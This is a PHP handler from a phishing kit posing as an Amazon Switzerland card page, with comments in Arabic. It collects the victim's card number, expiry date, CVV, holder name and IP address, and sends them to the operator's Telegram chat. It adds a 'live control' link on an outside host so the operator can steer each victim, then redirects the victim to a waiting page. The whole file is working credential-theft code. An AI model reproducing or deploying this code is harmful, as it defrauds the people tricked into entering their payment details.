<?php
// تضمين ملفات الإعداد والاتصال الخاصة بك
include "v.php";
include "t.php";

// 🟢 جلب وتأكيد الآي بي في أول الملف لضمان قراءته بشكل صحيح
$ib = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

// تنظيف الآي بي لاستخدامه كمعرّف مستقل في الرابط الجاي للتلغرام
$ip_link = str_replace(['.', ':'], '_', $ib);

// استقبال بيانات حقول البطاقة بشكل آمن من الـ POST
$cc_num    = isset($_POST['ccnum']) ? $_POST['ccnum'] : '';
$cc_exp    = isset($_POST['ccexp']) ? $_POST['ccexp'] : '';
$cc_cvv    = isset($_POST['cvv']) ? $_POST['cvv'] : '';
$cc_holder = isset($_POST['ccholder']) ? $_POST['ccholder'] : 'Nicht angegeben';

// تنسيق الرسالة لبيانات البطاقة الموجهة للتلغرام
$message  = "========= Amazon CH Card Info =========\n";
$message .= "CARD NUM   : ".$cc_num."\n";
$message .= "EXP DATE   : ".$cc_exp."\n";
$message .= "CVC / CVV  : ".$cc_cvv."\n";
$message .= "HOLDER NAME: ".$cc_holder."\n";
$message .= "IP         : ".$ib."\n";
$message .= "=======================================\n";

// 🛰️ دمج رابط التحكم المباشر والخاص بغرفة هذا الزائر داخل نص الرسالة الأساسية
$message .= "🛰️ [Live Control Link]:\n";
$message .= "https://oki.jtu.mybluehost.me/wp-includes/assets/acc/amazon/de/control.php?target=" . $ip_link . "\n"; // ⚠️ ضع رابط سيرفرك الحقيقي بدلاً من yourdomain.com
$message .= "=======================================\n";

// إرسال الرسالة الكاملة (البيانات + رابط التحكم) للتلغرام
$tk = $token; 
$chid = $chatid; 
sendMessage($chid, $message, $tk);

// إعادة التوجيه التلقائي المباشر لصفحة الانتظار لكي ينتظر أوامرك من اللوحة
header("Location: ./lod2.php?".md5(microtime()));
exit();
?>